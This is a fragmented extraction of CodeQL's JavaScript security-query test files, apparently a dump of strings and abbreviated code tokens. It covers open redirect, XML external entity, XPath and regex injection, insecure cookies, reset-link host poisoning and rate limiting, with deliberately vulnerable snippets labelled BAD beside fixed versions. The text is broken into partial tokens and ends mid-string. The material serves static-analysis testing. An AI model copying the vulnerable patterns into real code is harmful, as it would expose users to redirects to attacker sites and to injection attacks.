"?";/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/tst9.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ClientSideUrlRedirect/typed.ts location source// location source type-tracking step 1 - not the source// type ...  source type-tracking step 2 - also not the sourcesecondLocclass M ...     }\n}compone ... ;\n    }const { ... .props;{ locat ... ).props{ location }(this as any).props(this as any)this as any{ locat ... ation }location: Locationvar par ... search;params  ... .searchthis.do ... arams);this.do ... params)this.doRedirectprivate ... ;\n    }window. ... ctUri);window. ... ectUri)compone ...  \n    }var con ...      };contain ...       }loc: locationvar sec ... er.loc;secondL ... ner.loccontainer.locthis.my ... ndLoc);this.my ... ondLoc)this.my ... edirect{ // ty ... ;\n    }this.do ... earch);this.do ... search)loc.search/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ServerSideUrlRedirect/express.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ServerSideUrlRedirect BAD: a request parameter is incorporated without validation into a URL redirect// BAD: ... edirect GOOD: request parameter is embedded in query string// GOOD ...  string GOOD: request parameter is embedded in hash// GOOD ... in hash GOOD: request parameter is sanitized before incorporating it into the redirect// GOOD ... edirect BAD: sanitization doesn't apply here// BAD: ... ly here BAD: may be a global redirection// BAD: ... rection GOOD: local redirect GOOD: localhost redirect GOOD: request parameter is checked against whitelist// GOOD ... itelist BAD: check does not apply here GOOD: request input embedded in query string GOOD: request input still embedded in query string BAD: request input becomes before query string// BAD: ...  string BAD: value comes from query parameter// BAD: ... rameter BAD - could go to //evil.com// BAD  ... vil.com BAD - could go to u.evil.com BAD - could go to //u.evil.com, but not flagged [INCONSISTENCY]"target""Location"'/some/other/path'someUrl"?target="HASH'/some/other/path2'"anchor"isLocalURL'action'"/google_contacts""/Me/"'/putasync/:retry/:finalState'retryfinalStategetPascalCasescenariogetLROAsyncScenarioName"putasync"pollingUri'http://localhost:'getPort'/lro/putasync/''/operationResults/200/''Azure-AsyncOperation''Location''retry''Retry-After''{ "properties": { "provisioningState": "Accepted"}, "id": "100", "name": "foo" }'send400'Unable to parse "putAsync" scenario with retry: "''", finalState: "''/yet/another/path''/hopefully/the/final/path'?target=SAFE_TARGETS"Denied!"'/array/join''index.html?section='section'34''&subsection='subsection'?section='sendUserToUrlnextUrlredrect'/call''/redirect/:user''/users/''users/''u''/u'functio ... t"));\n}{\n  //  ... t"));\n}res.red ... get"));res.red ... rget"))res.redirectreq.param("target")app.all ... ));\n});app.all ... "));\n})app.allres.hea ... get"));res.hea ... rget"))/some/other/pathsomeUrl ... arget")someUrl ... arget="someUrl()const HASH = "#";HASH = "#"app.get ... )));\n})/some/other/path2functio ... ")));\n}{\n  //  ... ")));\n}res.red ... or")));res.red ... hor")))someUrl ... chor"))(HASH + ... chor"))HASH +  ... nchor")req.param("anchor")app.get ... t);\n});app.get ... et);\n}){\n  var ... get);\n}var tar ... rget");target  ... arget")if (isL ... arget);isLocalURL(target)res.red ... arget);res.redirect(target)app.get ... s")\n});app.get ... ts")\n})functio ... cts")\n}{\n  //  ... cts")\n}res.red ... tacts")(req.pa ... ntacts"(req.pa ...  != "")req.par ... ) != ""req.param('action')/google_contactsapp.get ... l);\n});app.get ... rl);\n}){\n  var ... url);\n}var han ... ams[0];handle  ... rams[0]var url ...  + "/";url = " ... e + "/""/Me/"  ... e + "/""/Me/" + handle/Me/var qs  ... query);qs = qu ... .query)queryst ... .query)if (qs. ... " + qs;qs.length > 0qs.lengthurl += "?" + qs;url += "?" + qs"?" + qsres.hea ... , url);res.hea ... ", url)router. ...   }\n});router. ... \n  }\n})router.put'/putas ... lState'/putasync/:retry/:finalState{\n  var ... ;\n  }\n}var ret ... .retry;retry = ... s.retryreq.params.retryvar fin ... State);finalSt ... lState)getPasc ... lState)req.par ... alStatevar sce ... State);scenari ... lState)getLROA ... lState)getLROA ... rioNameputasyncif (sce ... ');\n  }{\n    v ... ');\n  }var pol ... /200/';polling ... s/200/''http:/ ... s/200/''http:/ ... rCase()'http:/ ... y + '/''http:/ ... + retry'http:/ ... async/''http:/ ... tPort()http://localhost:utils.getPort()utils.getPort/lro/putasync/finalSt ... rCase()finalSt ... werCase'/opera ... s/200/'/operationResults/200/var hea ... \n    };headers ... i\n    }{\n      ... i\n    }'Azure- ... lingUri'Azure- ... ration'Azure-AsyncOperation'Locati ... lingUriif (ret ... ;\n    }retry === 'retry'headers ... '] = 0;headers ... r'] = 0headers ... After']Retry-Afterres.set ... o" }');res.set ... oo" }')res.set ... 00).endres.set ... us(200)res.set ... .status'{ "pro ... foo" }'{ "properties": { "provisioningState": "Accepted"}, "id": "100", "name": "foo" }{\n    u ... ');\n  }utils.s ... + '"');utils.s ...  + '"')utils.send400'Unable ... e + '"''Unable ... alState'Unable ... ate: "''Unable ... + retry'Unable ... try: "'Unable to parse "putAsync" scenario with retry: "", finalState: "app.get ... o`);\n})/yet/another/pathfunctio ... oo`);\n}{\n  //  ... oo`);\n}res.red ... /foo`);res.red ... }/foo`)`${req. ... )}/foo`app.get ... }`);\n})'/hopef ... l/path'/hopefully/the/final/pathfunctio ... )}`);\n}{\n  //  ... )}`);\n}res.red ... t")}`);res.red ... et")}`)`${some ... get")}`{\n  let ... get);\n}let tar ... rget");if (SAF ... arget);SAFE_TA ... target)SAFE_TA ... ropertyif (tar ... arget);target  ... TARGETSSAFE_TA ... definedSAFE_TARGETS[target]if (voi ... arget);void(0) ... target]void(0)(0)res.send("Denied!");res.send("Denied!")Denied!app.get ... '));\n})/array/joinfunctio ... ''));\n}{\n  //  ... ''));\n}res.red ... n(''));res.red ... in(''))['index ... oin('')['index ... n].join['index ... ection]'index. ... ction='index.html?section=html?section=req.query.sectionres.red ... ction);res.red ... ection)['index ... section['index ... ction='['index ... '].join['index ... , '34']&subsection=req.query.subsection[req.qu ... oin('')[req.qu ... n].join[req.qu ... ection]req.query.page?section=functio ... Url);\n}{\n  //  ... Url);\n}res.red ... xtUrl);res.redrect(nextUrl)res.redrect/call{\n  sen ... Url);\n}sendUse ... xtUrl);sendUse ... extUrl)req.query.nextUrlapp.get ... OOD\n});app.get ... GOOD\n})/redirect/:userfunctio ...  GOOD\n}{\n  res ...  GOOD\n}res.red ... .user);res.red ... s.user)'/users ... ms.user/users/req.params.user'users/ ... ms.userusers/'/' + r ... ms.user'//' +  ... ms.user'u' + r ... ms.userres.red ... user));res.red ... .user))'/' + ( ... s.user)('/u' + ... s.user)'/u' +  ... ms.user/ures.red ... y.foo);res.red ... ry.foo)({query ... OT OK\n}{query}query.foo/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ServerSideUrlRedirect/koa.js possibly OK - flagged anyway// poss ...  anywayurlLibisCrossDomainRedirectVALID/[^\w/-]/const K ... 'koa');urlLib  ... ('url')const a ...  Koa();app.use ... \n\t}\n});app.use ... K\n\t}\n})async c ... OK\n\t}\n}var url ... target;url = c ... .targetctx.query.targetctx.queryctx.redirect(url);ctx.redirect(url)ctx.redirectctx.red ... ${x}`);ctx.red ... }${x}`)`${url}${x}`var isC ... stname;isCross ... ostnameisCross ... edirecturlLib. ... ostnameurlLib. ... , true)urlLib.parseurl || ''if(!url ... T OK\n\t}!url || ... edirect!url{\n\t\tctx ... / OK\n\t}ctx.redirect('/');ctx.redirect('/'){\n\t\tctx ... T OK\n\t}if(!url ... yway\n\t}!url || ... (VALID)url.match(VALID){\n\t\tctx ... yway\n\t}if(!url ... / OK\n\t}!url || ... \w/-]/)url.match(/[^\w/-]/)[^\w/-]app.listen(3000);app.listen(3000)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ServerSideUrlRedirect/node.js GOOD: local redirects are unproblematic// GOOD ... lematic BAD: this could be a non-local redirect GOOD: localhost redirects are unproblematic GOOD: comparison against known URLs// GOOD ... wn URLs302'/local/''//localhost/''semmle.com'me"me""?from="var ser ... rect\n})server  ... rect\n})https.c ... rect\n})functio ... irect\n}{\n  let ... irect\n}url.par ... .targetres.wri ... get });res.wri ... rget }){ Location: target }Location: targetserver. ...  });\n})(req, r ... t });\n}{\n  let ... t });\n}{ Locat ... arget }Locatio ...  target'/local/' + target/local/'/' + target'//loca ...  target//localhost/if (tar ... get });target  ... le.com'semmle.comsemmle(req, r ... e });\n}{\n  let ... e });\n}let me = "me"me = "me"res.wri ...  me });res.wri ... + me }){ Locat ...  + me }Locatio ... =" + metarget  ... =" + metarget + "?from="?from=/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-601/ServerSideUrlRedirect/react-native.jsurl={tainted}{uri: tainted}uri: tainted/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/closure.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611 OK: Closure does not expand external entities// OK:  ... ntitiesdomloadXmlfunctio ... src);\n}{\n  var ... src);\n}var src ... search;src = d ... .searchgoog.do ... l(src);goog.do ... ml(src)goog.dom.xml.loadXmlgoog.dom.xmlgoog.dom/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/domparser.js OK: DOMParser only expands internal general entities NOT OK: XMLDOM expands external entities by default// NOT  ... default NOT OK: MSXML expands external entities by default'text/xml'"Microsoft.XMLDOM""Msxml2.DOMDocument"functio ... }\n  }\n}{\n  var ... }\n  }\n}if (win ...   }\n  }window.DOMParser{\n    / ... ');\n  }new DOM ... /xml');new DOM ... t/xml')var parser;(new Ac ... L(src);(new Ac ... ML(src)(new Ac ... loadXML(new Ac ... LDOM"))new Act ... MLDOM")Microsoft.XMLDOMMicrosoftXMLDOM(new Ac ... ment"))new Act ... ument")Msxml2.DOMDocumentMsxml2DOMDocument/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/expat.js OK: expat does not expands external entitiesexpat'node-expat'Parser"some-xml"const e ... xpat');expat = ... expat')require ... expat')node-expatexpress ... ));\n});express ... "));\n})functio ... l"));\n}{\n  //  ... l"));\n}new expat.Parser()expat.Parserparser. ... xml"));parser. ... -xml"))parser.writereq.par ... e-xml")some-xml/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/externs.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/jquery.js$.parseXML(src);$.parseXML(src)$.parseXML/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/libxml.js OK: libxml does not expand entities by default// OK:  ... defaultlibxmljs'libxmljs'parseXmlconst l ... mljs');libxmlj ... xmljs')require('libxmljs')libxmlj ... xml"));libxmlj ... -xml"))libxmljs.parseXml/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/libxml.noent.js NOT OK: unguarded entity expansion// NOT  ... pansion OK - no entity expansion// OK - ... pansionnoentparseXmlStringproductsfunctio ... e });\n}{\n  //  ... e });\n}libxmlj ... rue });libxmlj ... true }){ noent: true }noent: trueexpress ... e})\n});express ... se})\n})express().postfunctio ... lse})\n}{\n  //  ... lse})\n}libxmlj ... :true})libxmlj ... lString{noent:true}noent:truereq.fil ... 'utf8')req.fil ... oStringreq.fil ... ts.datareq.files.productslibxmlj ... false}){noent:false}noent:false/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/libxml.sax.js NOT OK: the SAX parser expands external entities by defaultSaxParserparseStringexpress ... ult\n});express ... ault\n})functio ... fault\n}{\n  con ... fault\n}const p ... rser();new lib ... arser()libxmljs.SaxParserparser.parseString/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-611/libxml.saxpush.jsSaxPushParserlibxmlj ... hParserparser.push/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-614/test_cookie-session.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-614'example.com'app.use ... ate\n}))session ... Date\n}){\n    n ... yDate\n}domain: ... le.com'path: 'foo/bar'expires: expiryDate/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-614/test_express-session.js'trust proxy'app.use ...  OK\n}))session ... T OK\n})secret: 'secret'{ secure: false }cookie: {}const s ... OT OK\n}sess =  ... OT OK\n}app.set ... xy', 1)trust proxysession ... / OK\n})/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-614/test_httpserver.js"type=ninja""type=ninja; Secure""language=javascript""type=ninja; secure"type=ninjares.set ... cure");res.set ... ecure")type=ninja; Secure["type= ... cript"]"langua ... script"language=javascriptres.set ... ure"]);res.set ... cure"])["type= ... ecure"]type=ninja; secure/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-614/test_jscookie.jsjs_cookie'js-cookie''key'const j ... ookie')js_cook ... ookie')require('js-cookie')js-cookiejs_cook ... lse });js_cook ... alse })js_cookie.setjs_cook ... rue });js_cook ... true })/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-614/test_responseCookie.js'/b'/blet opt ... K\n    }options ... K\n    }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-640/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-640'/resetpass'getUserSecretResetToken'Forgot password'Hi, looks like you forgot your password. Click here to reset: https:///resettoken/Hi, looks like you forgot your password. Click <a href="https://">here</a> to reset.Hi, looks like you forgot your password. Click here to reset: https://example.com/resettoken/Hi, looks like you forgot your password. Click <a href="https://example.com/resettoken//resetpasslet ema ... .email;email = ... y.emailreq.query.emaillet tok ... email);token = ... (email)backend ... (email)backend ... etTokengetUser ... etTokento: emailsubject ... ssword'Forgot passwordtext: ` ... token}``Hi, lo ... token}`Hi, loo ... ttps://req.hosthtml: ` ... reset.``Hi, lo ... reset.`Hi, loo ... ttoken//mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-643/XpathInjectionBad.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-643 BAD: Use user-provided data directly in an XPath expression// BAD: ... ressionxpath'xpath''/some/route'"userName"badXPathExpr"//users/user[login/text()='""']/home_dir/text()"const x ... path');xpath = ... xpath')require('xpath')/some/routelet use ... Name");userNam ... rName")req.par ... rName")let bad ... xt()");badXPat ... ext()")xpath.p ... ext()")xpath.parse"//user ... text()""//user ... serName"//user ... xt()='"//users/user[login/text()='']/home_dir/text()badXPat ... t\n  });badXPat ... ot\n  })badXPathExpr.select{\n    node: root\n  }node: root/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-643/XpathInjectionGood.js GOOD: Embed user-provided data using variables// GOOD ... riablesgoodXPathExpr"//users/user[login/text()=$userName]/home_dir/text()"let goo ... xt()");goodXPa ... ext()")//users/user[login/text()=$userName]/home_dir/text()//users/user[login/text()=$userName]/home_dir/textgoodXPa ... }\n  });goodXPa ...  }\n  })goodXPathExpr.select{\n    n ... e }\n  }variabl ... rName }{ userN ... rName }userName: userName/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-643/tst.jsselect1useNamespaceslet tai ... Name");tainted ... rName")xpath.p ... inted);xpath.parse(tainted)xpath.s ... inted);xpath.s ... ainted)xpath.selectxpath.select1let exp ... s(map);expr =  ... es(map)xpath.u ... es(map)xpath.useNamespacesexpr(tainted);expr(tainted)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-643/tst2.jslet que ... ing(1);query = ... ring(1)documen ... query);documen ... (query)documen ... ressiondocument.evaluate/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-730/RegExpInjection.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-730 BAD: Unsanitized user input is used to construct a regular expressionURI"urijs"'/findKey're"\\b""=(.*)\n"wrap2mkRegExpdefString"someString"likelyStringnotStringmaybeString"-"Search'./search'/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/gescape1/[\x00-\x7f]/g'\\x''00'escape2/([\.$?*|{}\(\)\[\]\\\/\+\-^])/g'/has-sanitizer'"^.*\.("/,/g")$"var URI ... rijs");URI = r ... urijs")require("urijs")urijs/findKeyvar key ... nput");key = r ... ("key")req.param("key")input = ... input")req.param("input")var re  ... *)\n");re = ne ... .*)\n")new Reg ... .*)\n")"\\b" + ... (.*)\n""\\b" + key=(.*)
{\n    r ... s);\n  }return  ... ap2(s);"\\b" + wrap2(s)wrap2(s)functio ... n";\n  }{\n    r ... n";\n  }return  ... .*)\n";s + "=(.*)\n"new Reg ... (key));new Reg ... p(key))wrap(key)return  ... "key");new Reg ... Key());new RegExp(getKey())getKey()return  ... Exp(s);new RegExp(s)mkRegExp(key);mkRegExp(key)mkRegExp(getKey());mkRegExp(getKey())var def ... tring";defStri ... String"someStringvar lik ... ng: 42;likelyS ... ing: 42x? defString: 42var notString = {};notString = {}if (def ... ut)) {}defStri ... (input)defString.matchif (lik ... ut)) {}likelyS ... (input)likelyString.matchif (may ... ut)) {}maybeSt ... (input)maybeString.matchif (not ... ut)) {}notStri ... (input)notString.matchdefStri ... input);defString.searchlikelyS ... input);likelyString.searchmaybeSt ... input);maybeString.searchnotStri ... input);notString.searchURI(`${ ... input);URI(`${ ... (input)URI(`${ ... .searchURI(`${ ... path}`)`${prot ... {path}`URI(`${ ... href();URI(`${ ... .href()URI(`${ ... t).hrefunknown ... nknown;unknown ... unknownunknown ... (input)unknown.searchnew Reg ... ("-"));new Reg ... n("-"))key.spl ... in("-")key.spl ... x).joinkey.spl ... x => x)key.spl ... .filterkey.split(".")key.splitx => ximport  ... earch';./search/search* as SearchSearch. ... input);Search.search(input)Search.searchnew RegExp(input);new RegExp(input)var san ... \\$&");sanitiz ... "\\$&")input.r ... "\\$&")input.replace/[\-\[\ ... \$\|]/g[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]new Reg ... tized);new Reg ... itized)functio ... ; });\n}{\n  ret ... ; });\n}return  ... 2); });pattern ... -2); })pattern.replace[\x00-\x7f]\x00-\x7f\x00\x7ffunctio ... (-2); }{ retur ... (-2); }return  ... tr(-2);'\\x' + ... str(-2)\x('00' + ... str(-2)('00' + ... .substr('00' + ... ng(16))'00' +  ... ing(16)00s.charC ... ing(16)s.charC ... oStrings.charCodeAt()s.charCodeAtfunctio ... ;\n});\n}{\n  ret ... ;\n});\n}return  ... ch;\n});str.rep ...  ch;\n})/([\.$? ... \-^])/g([\.$?*|{}\(\)\[\]\\\/\+\-^])[\.$?*|{}\(\)\[\]\\\/\+\-^]functio ... + ch;\n}{\n    r ... + ch;\n}return "\\" + ch;"\\" + ch/has-sanitizervar inp ... nput");new Reg ... nput));new Reg ... input))escape1(input)escape2(input)new Reg ...  ")$");new Reg ... + ")$")"^.*\.( ...  + ")$""^.*\.( ... g, "|")^.*.(input.r ... g, "|"))$/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-730/RegExpInjectionGood.js GOOD: User input is sanitized before constructing the regex// GOOD ... e regexsafeKeyescapeRegExpvar _ = ... dash');_ = req ... odash')app.get ... n");\n})functio ... \n");\n}{\n  var ... \n");\n}var saf ... p(key);safeKey ... xp(key)_.escapeRegExp(key)_.escapeRegExp"\\b" + safeKey/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-730/client-side.js OK - we do not flag RegExp injection on the client side as the impact is too low// OK - ... too lowfunctio ... o low\n}{\n    l ... o low\n}let tai ... ing(1);taint = ... ring(1)new RegExp(taint);new RegExp(taint)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-730/search.js Do nothing!// Do nothing!someOtherExportmodule. ... = true;module. ...  = truemodule. ... rExportexport  ... hing!\n}functio ... hing!\n}{\n\t// Do nothing!\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-730/server-crash.js for manual testing of the fickle node.js runtime// for  ... runtime OK: guarded caller// OK:  ...  caller OK: guarded throw// OK: guarded throw OK: guarded call// OK: guarded call NOT OK [INCONSISTENCY]: need to add property reads as sinks// NOT  ... s sinks OK (does not take callbacks at all)// OK ( ... at all) can nest async calls (and only warns about the inner one)// can  ... er one) can not catch async exceptions// can  ... eptions can mix sync/async calls// can  ... c calls OK, requires `node --unhandled-rejections=strict ...` to terminate the process// OK,  ... process on path// on path not on path// not on path12000Example app listening on port "/foo"indirection3indirection4indirection5indirection6"/async-throw""reflected"indirection7"/async-throw-again""e""/throw-in-promise-1""/throw-in-promise-2""/throw-in-promise-3""/throw-in-event-emitter"MyEmittermyEmitter"event""/throw-with-ambiguous-paths"withAsyncconst e ... ress");const f ... ("fs");const E ... ents");EventEm ... vents")const port = 12000;port = 12000let ser ... }!`)\n);server  ... t}!`)\n)app.lis ... t}!`)\n)() =>\n  ... ort}!`)console ... ort}!`)`Exampl ... port}!`Example ... n port {\n  fs. ...   });\n}fs.read ... K\n  });fs.read ... OK\n  })(err, x ...  OK\n  }throw err;{\n  thr ... OT OK\n}throw 42;functio ... e) {}\n}{\n  try ... e) {}\n}(err, x ... K\n    }functio ... aller\n}{\n  thr ... aller\n}functio ... n6();\n}{\n  ind ... n6();\n}indirection6();indirection6()app.get ...  {}\n});app.get ... ) {}\n})/async-throw(req, r ... e) {}\n}{\n  fs. ... e) {}\n}fs.read ... }\n  });fs.read ... {}\n  })(err, x ...  {}\n  }{\n    t ...  {}\n  }{\n      ... w\n    }fs.read ... ]\n  });fs.read ... Y]\n  })(err, x ... CY]\n  }{\n    r ... CY]\n  }res.set ... eader);res.set ... header)reflectedreq.query.header{\n      ... l\n    }indirection1();indirection1()fs.read ... ;\n  });fs.read ... );\n  })(err, x ... ();\n  }{\n    i ... ();\n  }indirection2();indirection2()indirection3();indirection3()indirection4();indirection4()indirection5();indirection5()req.query.foo;req.que ... ring();req.que ... tring()req.que ... oStringfs.read ... s\n  });fs.read ... ks\n  })(err, x ... nks\n  }{\n    r ... nks\n  }req.query.foo.bar;req.query.foo.barres.set ... known);res.set ... nknown)indirection7();indirection7()/async-throw-againthrow "e";fs.read ... )\n  });fs.read ... l)\n  })() => { ... ll)\n  }{\n    t ... ll)\n  }() => { ... });\n  }() => { ... K\n    }() => { ...  {}\n  }{\n    / ...  {}\n  }{\n    ( ... ();\n  }(() =>\n ...  }))();(() =>\n ...   }))()(() =>\n ...     }))() =>\n  ...      })app.get ... ();\n});app.get ... n();\n})"/throw ... mise-1"/throw-in-promise-1async ( ... un();\n}{\n  asy ... un();\n}async f ... ess\n  }{\n    t ... ess\n  }await fun();await fun()fun()"/throw ... mise-2"/throw-in-promise-2async f ... });\n  }"/throw ... mise-3"/throw-in-promise-3async ( ...   });\n}fs.read ... ss\n  })async ( ... ess\n  }app.get ... t");\n})"/throw ... mitter"/throw-in-event-emitterasync ( ... nt");\n}{\n  cla ... nt");\n}class M ... tter {}const m ... tter();myEmitt ... itter()new MyEmitter()myEmitt ... s\n  });myEmitt ... ss\n  })myEmitter.on() => { ... ess\n  }myEmitt ... vent");myEmitt ... event")myEmitter.emitapp.get ... c();\n})"/throw ... -paths"/throw-with-ambiguous-paths(req, r ... nc();\n}{\n  fun ... nc();\n}functio ... ath\n  }{\n    t ... ath\n  }throwError();throwError()functio ... b);\n  }{\n    t ... b);\n  }fs.stat(X, cb);fs.stat(X, cb)withAsync();withAsync()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-730/tst.js"^""i"SOMEONE_I_TRUST"myself"let data = e.data;data = e.datae.datanew Reg ... , "i");new Reg ... ", "i")"^"+ data.name + "$""^"+ data.nameconst S ... yself";SOMEONE ... myself"myselfwindow. ...   }\n});window. ...    }\n})if (e.o ... K\n    }e.origi ... I_TRUSTe.origin/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-754/UnsafeDynamicMethodAccess.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-754 copied from tests for `UnsafeDynamicMethodAccess.ql` to check that they do not overlap// copi ... overlap NOT OK, but reported by UnsafeDynamicMethodAccess.ql [INCONSISTENCY]window. ... CY]\n});window. ... NCY]\n})(ev) => ... ENCY]\n}{\n    l ... ENCY]\n}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-754/UnvalidatedDynamicMethodCall.js'/perform/:action/:payload'var act ... .\n  }\n}actions ... .\n  }\n}{\n  pla ... .\n  }\n}play(da ... ...\n  }(data)  ... ...\n  }{\n    // ...\n  }pause(d ... ...\n  }app.get ... d));\n})'/perfo ... ayload'/perform/:action/:payloadfunctio ... ad));\n}{\n  let ... ad));\n}let act ... ction];action  ... action]actions ... action]req.params.actionres.end ... load));res.end ... yload))action( ... ayload)req.params.payload/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-754/UnvalidatedDynamicMethodCallGood.js"play""pause""Unsupported action."var act ...  Map();actions = new Map()new Map()actions ... ...\n});actions ...  ...\n})actions.putif (act ... ");\n  }actions ... action)actions.has{\n    l ... ));\n  }let act ... ction);action  ... action)actions.getres.end ... ion.");res.end ... tion.")"Unsupp ... ction."Unsupported action.Unsupported action/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-754/UnvalidatedDynamicMethodCallGood2.jsapp.get ... .");\n})functio ... n.");\n}{\n  if  ... n.");\n}if (act ...   }\n  }actions ... roperty{\n    l ...   }\n  }typeof action/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-754/tst.js NOT OK: might not be a function// NOT  ... unction OK: exception is caught// OK:  ...  caught NOT OK: might be `valueOf`// NOT  ... alueOf` NOT OK: might be `__defineSetter__`// NOT  ... tter__` NOT OK: might be `valueOf` or `toString`// NOT  ... String` NOT OK, but not flagged [INCONSISTENCY] OK: cannot be from prototype// OK:  ... ototype(functi ...  });\n})let obj ... {}\n  };obj = { ...  {}\n  }{\n    foo() {}\n  }foo() {}window. ... }\n  });window. ...  }\n  })(ev) => ...   }\n  }let nam ... ).name;name =  ... a).nameJSON.pa ... a).nameobj[ev.data]();obj[ev.data]()obj[ev.data]obj[name]();obj[name]()obj[name]try {\n  ... h(e) {}{\n      ... t\n    }catch(e) {}let fn = obj[name];fn = obj[name]fn();fn()if (typ ... `\n    }typeof fnnew fn();new fn()if (obj ... ame]();if (typ ... ame]();typeof obj[name]if (obj ... ]\n    }obj.has ... y(name)obj.hasOwnPropertylet key ... + name;key = "$" + name"$" + nameobj[key]();obj[key]()obj[key]if (typ ... key]();typeof obj[key]fn.apply(obj);fn.apply(obj)fn.applylet obj ... (null);obj2 =  ... e(null)Object.create(null)obj2.fo ... n() {};obj2.fo ... on() {}obj2.foowindow. ... e\n  });window. ... pe\n  })(ev) => ... ype\n  }{\n    l ... ype\n  }let fn = obj2[name];fn = obj2[name]obj2[name]if (typ ...   fn();/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-770/MissingRateLimiting.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-770'/:path'isValidPathapp.get ... h);\n});app.get ... th);\n})/:pathfunctio ... ath);\n}{\n  let ... ath);\n}let pat ... s.path;path =  ... ms.pathreq.params.pathif (isV ... (path);isValidPath(path)res.sendFile(path);res.sendFile(path)app.get ... 2, f3);app.get ... f2, f3)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-770/MissingRateLimitingGood.js set up rate limiter: maximum of five requests per minute// set  ...  minute 1 minute// 1 minute apply rate limiter to all requests// appl ... equestsRateLimit'express-rate-limit'limiterwindowMsvar Rat ... imit');RateLim ... limit')require ... limit')express-rate-limitvar lim ... : 5\n});limiter ... x: 5\n})new Rat ... x: 5\n}){\n  win ... ax: 5\n}windowMs: 1*60*10001*60*10001*60max: 5app.use(limiter);app.use(limiter)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-770/rateLimit.tsrateLimitrateLimitMiddlewareimport  ... limit';const r ... imit();rateLim ... Limit()rateLimit()export  ... leware;/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-770/tst.js no rate limiting// no rate limiting rate limiting using express-rate-limit// rate ... e-limit rate limiting using express-brute// rate ... s-brute rate limiting using express-limiter// rate ... limiter rate limiting using rate-limiter-flexible// rate ... lexible'localhost''me'database'my_db'expensiveHandler1expensiveHandler2"log"expensiveHandler3"/bin/true"expensiveHandler4'SELECT 1 + 1 AS solution'inexpensiveHandler"Hi"mkSubRouter1mkSubRouter2app1ExpressBrute'express-brute'bruteforceprevent'express-limiter'verifyUserRateLimiterRedis'rate-limiter-flexible'rateLimiterrateLimiterMiddlewareconsume429'rate 